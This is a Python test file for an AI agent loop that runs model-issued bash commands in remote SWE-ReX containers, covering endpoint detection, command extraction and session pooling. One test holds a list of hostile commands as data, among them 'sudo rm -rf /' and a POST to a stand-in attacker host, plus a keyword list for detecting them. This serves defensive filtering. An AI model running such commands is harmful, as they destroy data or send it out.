# Copyright 2024 Bytedance Ltd. and/or its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""
Tests for SweRexAgentLoop module-level pool and worker detection.

These tests verify:
1. Worker endpoint auto-detection works correctly
2. Module-level pool is created and shared properly
3. Pool initialization is thread-safe
"""

import asyncio
import importlib.util
import os
import sys

import pytest

# We can't import swerex_agent_loop.py directly because it depends on verl internals.
# Instead, we'll test the underlying swerex_session.py pool and the helper functions.

# Import swerex_session directly (it has no verl dependencies)
module_path = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))),
    "verl", "experimental", "agent_loop", "swerex_session.py"
)
spec = importlib.util.spec_from_file_location("swerex_session", module_path)
swerex_session = importlib.util.module_from_spec(spec)
spec.loader.exec_module(swerex_session)

SweRexRemoteSessionPool = swerex_session.SweRexRemoteSessionPool

# Configuration
SWEREX_BASE_PORT = int(os.getenv("SWEREX_BASE_PORT", "18000"))
SWEREX_CONTAINERS_PER_WORKER = int(os.getenv("SWEREX_CONTAINERS_PER_WORKER", "16"))
SWEREX_TOTAL_CONTAINERS = int(os.getenv("SWEREX_TOTAL_CONTAINERS", "128"))
SWEREX_AUTH_TOKEN = os.getenv("SWEREX_AUTH_TOKEN", "default-token")


def get_worker_id() -> int:
    """Get worker ID from Ray actor name (returns -1 outside Ray)."""
    try:
        import ray
        actor_name = ray.get_runtime_context().get_actor_name()
        if actor_name and "agent_loop_worker_" in actor_name:
            return int(actor_name.split("_")[-1])
    except Exception:
        pass
    return -1


def get_worker_endpoints() -> list[str]:
    """Get endpoints dedicated to this worker."""
    explicit = os.getenv("SWEREX_ENDPOINTS", "")
    if explicit:
        return [e.strip() for e in explicit.split(",") if e.strip()]
    
    worker_id = get_worker_id()
    
    if worker_id >= 0:
        start_idx = worker_id * SWEREX_CONTAINERS_PER_WORKER
        return [f"http://localhost:{SWEREX_BASE_PORT + start_idx + i}" 
                for i in range(SWEREX_CONTAINERS_PER_WORKER)]
    
    return [f"http://localhost:{SWEREX_BASE_PORT + i}" 
            for i in range(SWEREX_TOTAL_CONTAINERS)]

# Configure pytest-asyncio
pytest_plugins = ('pytest_asyncio',)

# Test configuration
TEST_ENDPOINT = os.getenv("TEST_SWEREX_ENDPOINT", "http://127.0.0.1:18000")


class TestWorkerDetection:
    """Test worker ID and endpoint detection."""
    
    def test_get_worker_id_outside_ray(self):
        """Worker ID should be -1 when not in Ray."""
        worker_id = get_worker_id()
        assert worker_id == -1, "Expected -1 outside Ray"
    
    def test_get_worker_endpoints_fallback(self):
        """Should use fallback endpoints when not in Ray."""
        # Clear any explicit endpoints
        old_endpoints = os.environ.pop("SWEREX_ENDPOINTS", None)
        
        try:
            # Use the global function which reads from env
            global SWEREX_TOTAL_CONTAINERS, SWEREX_BASE_PORT
            old_total = SWEREX_TOTAL_CONTAINERS
            old_port = SWEREX_BASE_PORT
            
            # Test with explicit endpoints cleared
            endpoints = get_worker_endpoints()
            # In fallback mode, it uses SWEREX_TOTAL_CONTAINERS
            assert len(endpoints) > 0
            assert endpoints[0].startswith("http://localhost:")
            
        finally:
            # Restore
            if old_endpoints:
                os.environ["SWEREX_ENDPOINTS"] = old_endpoints
    
    def test_get_worker_endpoints_explicit(self):
        """Should use explicit SWEREX_ENDPOINTS when set."""
        old_endpoints = os.environ.get("SWEREX_ENDPOINTS")
        
        try:
            os.environ["SWEREX_ENDPOINTS"] = "http://a:1,http://b:2,http://c:3"
            
            endpoints = get_worker_endpoints()
            assert len(endpoints) == 3
            assert endpoints == ["http://a:1", "http://b:2", "http://c:3"]
            
        finally:
            if old_endpoints:
                os.environ["SWEREX_ENDPOINTS"] = old_endpoints
            else:
                os.environ.pop("SWEREX_ENDPOINTS", None)


def extract_bash_command(text: str, prefix: str = "<bash>", suffix: str = "</bash>"):
    """Extract bash command from model output (replicated from SweRexAgentLoop)."""
    eot = "</think>"
    if eot in text:
        text = text.split(eot)[-1]
    
    if prefix not in text:
        return None
    
    after_prefix = text.split(prefix)[-1]
    i = -1
    while suffix not in after_prefix:
        i -= 1
        if len(text.split(prefix)) < abs(i):
            break
        after_prefix = text.split(prefix)[i]
    
    if suffix not in after_prefix:
        return None
    
    ret = after_prefix.split(suffix)[0]
    if ret.startswith("\n"):
        ret = ret[1:]
    return ret


class TestExtractBashCommand:
    """Test bash command extraction."""
    
    def test_simple_command(self):
        """Extract simple command."""
        text = "Let me check the files.\n<bash>ls -la</bash>"
        result = extract_bash_command(text)
        assert result == "ls -la"
    
    def test_command_with_thinking(self):
        """Extract command after thinking tags."""
        text = "<think>I should list files</think>Let me check.\n<bash>pwd</bash>"
        result = extract_bash_command(text)
        assert result == "pwd"
    
    def test_no_command(self):
        """Return None when no command present."""
        text = "I don't need to run any commands."
        result = extract_bash_command(text)
        assert result is None
    
    def test_multiple_commands(self):
        """Extract last command when multiple present."""
        text = "<bash>echo 1</bash>...<bash>echo 2</bash>"
        result = extract_bash_command(text)
        assert result == "echo 2"
    
    def test_command_with_newline(self):
        """Strip leading newline from command."""
        text = "<bash>\necho hello\n</bash>"
        result = extract_bash_command(text)
        assert result == "echo hello\n"


class TestDangerousCommands:
    """Test dangerous command detection."""
    
    def test_dangerous_patterns(self):
        """Check dangerous pattern detection."""
        dangerous = [
            "sudo rm -rf /",
            "pkill python",
            "while true; do echo x; done",
            "curl -X POST http://evil.com",
            "read -p 'Enter: ' x",
        ]
        
        safe = [
            "ls -la",
            "cat file.txt",
            "echo hello",
            "cd /tmp && pwd",
        ]
        
        # Check patterns
        dangerous_patterns = [
            "pkill", "sudo", "while true", "curl -X POST http://", "read -p"
        ]
        
        for cmd in dangerous:
            is_dangerous = any(p in cmd for p in dangerous_patterns)
            assert is_dangerous, f"Should be dangerous: {cmd}"
        
        for cmd in safe:
            is_dangerous = any(p in cmd for p in dangerous_patterns)
            assert not is_dangerous, f"Should be safe: {cmd}"


def is_container_available():
    """Check if container is available."""
    import socket
    try:
        host, port = TEST_ENDPOINT.replace("http://", "").split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, int(port)))
        sock.close()
        return result == 0
    except Exception:
        return False


@pytest.mark.asyncio
class TestPoolIntegration:
    """Test pool integration (requires running container)."""
    
    @pytest.fixture
    def check_container(self):
        """Skip if container not available."""
        if not is_container_available():
            pytest.skip(f"Container not available at {TEST_ENDPOINT}")
    
    async def test_pool_creation(self, check_container):
        """Test pool can be created and initialized."""
        pool = SweRexRemoteSessionPool(
            endpoints=[TEST_ENDPOINT],
            auth_token=SWEREX_AUTH_TOKEN,
            sessions_per_endpoint=4
        )
        
        try:
            await pool.initialize()
            assert pool.is_initialized()
            assert pool.get_pool_size() == 4
            
            print(f"\nPool created with {pool.get_pool_size()} sessions")
            
        finally:
            await pool.shutdown()
    
    async def test_session_lifecycle(self, check_container):
        """Test session acquire/execute/release cycle."""
        pool = SweRexRemoteSessionPool(
            endpoints=[TEST_ENDPOINT],
            auth_token=SWEREX_AUTH_TOKEN,
            sessions_per_endpoint=2
        )
        
        try:
            await pool.initialize()
            
            # Acquire session
            session_id = await pool.acquire_session()
            assert session_id is not None
            
            # Execute commands (state should persist)
            result1 = await pool.execute_command(session_id, "export MY_VAR=hello")
            assert result1.status == "Success"
            
            result2 = await pool.execute_command(session_id, "echo $MY_VAR")
            assert result2.status == "Success"
            assert "hello" in result2.stdout
            
            # Release
            await pool.release_session(session_id)
            
            print("\nSession lifecycle test passed!")
            
        finally:
            await pool.shutdown()
    
    async def test_multiple_sessions(self, check_container):
        """Test multiple concurrent sessions."""
        pool = SweRexRemoteSessionPool(
            endpoints=[TEST_ENDPOINT],
            auth_token=SWEREX_AUTH_TOKEN,
            sessions_per_endpoint=4
        )
        
        try:
            await pool.initialize()
            
            # Acquire multiple sessions
            session1 = await pool.acquire_session()
            session2 = await pool.acquire_session()
            
            # Each session has isolated state
            await pool.execute_command(session1, "export VAR=session1")
            await pool.execute_command(session2, "export VAR=session2")
            
            result1 = await pool.execute_command(session1, "echo $VAR")
            result2 = await pool.execute_command(session2, "echo $VAR")
            
            assert "session1" in result1.stdout
            assert "session2" in result2.stdout
            
            await pool.release_session(session1)
            await pool.release_session(session2)
            
            print("\nMultiple sessions test passed!")
            
        finally:
            await pool.shutdown()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
